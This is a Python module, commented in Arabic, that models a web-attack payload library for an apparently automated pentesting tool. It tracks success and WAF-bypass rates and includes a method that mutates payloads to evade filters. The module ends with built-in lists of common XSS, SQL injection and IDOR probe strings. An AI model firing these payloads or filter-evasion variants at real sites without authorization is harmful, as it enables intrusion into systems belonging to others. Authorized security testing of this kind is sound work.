
from enum import Enum
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from datetime import datetime


class PayloadType(Enum):
    """أنواع الحمولات"""
    XSS = "xss"
    SQLI = "sqli"
    IDOR = "idor"
    SSTI = "ssti"
    LFI = "lfi"
    SSRF = "ssrf"
    XXE = "xxe"
    RCE = "rce"
    CUSTOM = "custom"


class PayloadContext(Enum):
    """سياق الحمولة"""
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    JSON = "json"
    XML = "xml"
    SQL = "sql"
    HEADER = "header"


class PayloadStatus(Enum):
    """حالة الحمولة"""
    PENDING = "pending"      # قيد الاختبار
    VERIFIED = "verified"    # تم التحقق من عملها
    BLOCKED = "blocked"      # محظورة
    EVOLVED = "evolved"      # تم تطويرها إلى نسخة أفضل
    DEPRECATED = "deprecated" # مهملة


class BypassLevel(Enum):
    """مستوى تجاوز الحماية"""
    NONE = 0      # لا تجاوز
    BASIC = 1     # تجاوز أساسي
    INTERMEDIATE = 2  # تجاوز متوسط
    ADVANCED = 3      # تجاوز متقدم
    EXPERT = 4        # تجاوز خبير


@dataclass
class PayloadExecution:
    """سجل تنفيذ حمولة"""
    target_url: str
    target_parameter: Optional[str] = None
    success: bool = False
    response_time_ms: float = 0.0
    status_code: int = 0
    waf_blocked: bool = False
    execution_time: datetime = field(default_factory=datetime.now)
    evidence: Optional[str] = None
    error_message: Optional[str] = None


@dataclass
class PayloadVariation:
    """نسخة متغيرة من الحمولة"""
    content: str
    bypass_level: BypassLevel = BypassLevel.NONE
    parent_payload_id: Optional[str] = None
    created_at: datetime = field(default_factory=datetime.now)
    success_count: int = 0
    total_attempts: int = 0
    
    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.0
        return self.success_count / self.total_attempts
    
    def record_attempt(self, success: bool):
        """تسجيل محاولة استخدام"""
        self.total_attempts += 1
        if success:
            self.success_count += 1


@dataclass
class Payload:
    """حمولة هجومية"""
    
    # معلومات أساسية
    id: str
    content: str
    payload_type: PayloadType
    context: PayloadContext
    
    # التصنيف
    name: str = ""
    description: str = ""
    tags: List[str] = field(default_factory=list)
    
    # التقييم
    effectiveness: float = 0.5      # 0-1
    stealth_score: float = 0.5       # 0-1 (كلما زاد، قل الاكتشاف)
    bypass_level: BypassLevel = BypassLevel.NONE
    waf_bypass_probability: float = 0.3
    
    # المتغيرات
    variations: List[PayloadVariation] = field(default_factory=list)
    
    # الإحصائيات
    success_count: int = 0
    total_attempts: int = 0
    last_used: Optional[datetime] = None
    created_at: datetime = field(default_factory=datetime.now)
    updated_at: datetime = field(default_factory=datetime.now)
    
    # الحالة
    status: PayloadStatus = PayloadStatus.PENDING
    
    # ميتاداتا
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def success_rate(self) -> float:
        """نسبة نجاح الحمولة"""
        if self.total_attempts == 0:
            return 0.0
        return self.success_count / self.total_attempts
    
    @property
    def has_variations(self) -> bool:
        """هل توجد متغيرات؟"""
        return len(self.variations) > 0
    
    def record_attempt(self, success: bool, execution_data: Dict = None):
        """تسجيل محاولة استخدام"""
        self.total_attempts += 1
        if success:
            self.success_count += 1
        self.last_used = datetime.now()
        self.updated_at = datetime.now()
        
        # تحديث الفعالية بناءً على النجاح
        if success:
            self.effectiveness = min(1.0, self.effectiveness + 0.05)
            self.waf_bypass_probability = min(0.95, self.waf_bypass_probability + 0.02)
        else:
            self.effectiveness = max(0.0, self.effectiveness - 0.03)
    
    def add_variation(self, content: str, bypass_level: BypassLevel = None) -> PayloadVariation:
        """إضافة متغير جديد"""
        variation = PayloadVariation(
            content=content,
            bypass_level=bypass_level or self.bypass_level,
            parent_payload_id=self.id
        )
        self.variations.append(variation)
        self.updated_at = datetime.now()
        return variation
    
    def get_best_variation(self) -> Optional[PayloadVariation]:
        """الحصول على أفضل متغير"""
        if not self.variations:
            return None
        return max(self.variations, key=lambda v: v.success_rate)
    
    def evolve(self) -> List[str]:
        """تطوير الحمولة (توليد متغيرات جديدة)"""
        evolved = []
        
        # تقنيات التطوير
        if "<script>" in self.content:
            # تجاوز حالة الأحرف
            evolved.append(self.content.replace("<script>", "<ScRiPt>"))
            # تجاوز الترميز
            evolved.append(self.content.replace("<", "%3C").replace(">", "%3E"))
        
        if "alert" in self.content:
            # استخدام backticks
            evolved.append(self.content.replace("alert('", "alert(`"))
            # استخدام confirm
            evolved.append(self.content.replace("alert", "confirm"))
        
        if "'" in self.content and self.payload_type == PayloadType.SQLI:
            # ترميز الاقتباس
            evolved.append(self.content.replace("'", "\\'"))
            # استخدام شرط مختلف
            evolved.append(self.content.replace("'", "\""))
        
        # إضافة المتغيرات الجديدة
        for new_content in evolved:
            if new_content != self.content:
                variation = self.add_variation(new_content, BypassLevel.BASIC)
                if variation not in self.variations:
                    self.variations.append(variation)
        
        if evolved:
            self.status = PayloadStatus.EVOLVED
        
        return evolved
    
    def to_dict(self) -> Dict[str, Any]:
        """تحويل إلى قاموس"""
        return {
            "id": self.id,
            "content": self.content[:100] + "..." if len(self.content) > 100 else self.content,
            "type": self.payload_type.value,
            "context": self.context.value,
            "name": self.name,
            "effectiveness": self.effectiveness,
            "bypass_level": self.bypass_level.value,
            "success_rate": self.success_rate,
            "total_attempts": self.total_attempts,
            "variations_count": len(self.variations),
            "status": self.status.value,
            "last_used": self.last_used.isoformat() if self.last_used else None,
            "created_at": self.created_at.isoformat()
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Payload':
        """إنشاء من قاموس"""
        return cls(
            id=data["id"],
            content=data["content"],
            payload_type=PayloadType(data["type"]),
            context=PayloadContext(data["context"]),
            name=data.get("name", ""),
            description=data.get("description", ""),
            tags=data.get("tags", []),
            effectiveness=data.get("effectiveness", 0.5),
            stealth_score=data.get("stealth_score", 0.5),
            bypass_level=BypassLevel(data.get("bypass_level", 0)),
            status=PayloadStatus(data.get("status", "pending"))
        )


@dataclass
class PayloadLibrary:
    """مكتبة الحمولات"""
    name: str
    description: str = ""
    payloads: List[Payload] = field(default_factory=list)
    created_at: datetime = field(default_factory=datetime.now)
    updated_at: datetime = field(default_factory=datetime.now)
    
    def add_payload(self, payload: Payload):
        """إضافة حمولة"""
        self.payloads.append(payload)
        self.updated_at = datetime.now()
    
    def get_by_type(self, payload_type: PayloadType) -> List[Payload]:
        """الحصول على حمولات حسب النوع"""
        return [p for p in self.payloads if p.payload_type == payload_type]
    
    def get_by_context(self, context: PayloadContext) -> List[Payload]:
        """الحصول على حمولات حسب السياق"""
        return [p for p in self.payloads if p.context == context]
    
    def get_best_for_context(self, context: PayloadContext, limit: int = 5) -> List[Payload]:
        """أفضل حمولات لسياق معين"""
        filtered = self.get_by_context(context)
        filtered.sort(key=lambda p: p.effectiveness, reverse=True)
        return filtered[:limit]
    
    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "description": self.description,
            "payloads_count": len(self.payloads),
            "created_at": self.created_at.isoformat()
        }


# دوال مساعدة لإنشاء حمولات شائعة
def create_xss_payload(content: str, context: PayloadContext = PayloadContext.HTML) -> Payload:
    """إنشاء حمولة XSS"""
    import uuid
    return Payload(
        id=f"PLS-{uuid.uuid4().hex[:8].upper()}",
        content=content,
        payload_type=PayloadType.XSS,
        context=context,
        name=f"XSS_{context.value}_payload",
        tags=["xss", context.value]
    )


def create_sqli_payload(content: str) -> Payload:
    """إنشاء حمولة SQLi"""
    import uuid
    return Payload(
        id=f"PLS-{uuid.uuid4().hex[:8].upper()}",
        content=content,
        payload_type=PayloadType.SQLI,
        context=PayloadContext.SQL,
        name="SQLi_injection_payload",
        tags=["sqli", "injection"]
    )


def create_idor_payload(content: str) -> Payload:
    """إنشاء حمولة IDOR"""
    import uuid
    return Payload(
        id=f"PLS-{uuid.uuid4().hex[:8].upper()}",
        content=content,
        payload_type=PayloadType.IDOR,
        context=PayloadContext.URL,
        name="IDOR_object_reference",
        tags=["idor", "authorization"]
    )


# مكتبات حمولات مدمجة
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "';alert('XSS');//",
    "\"><script>alert('XSS')</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' AND SLEEP(5)--",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--"
]

IDOR_PAYLOADS = [
    "1", "2", "3", "999", "admin", "test", "null", "0", "-1"
]

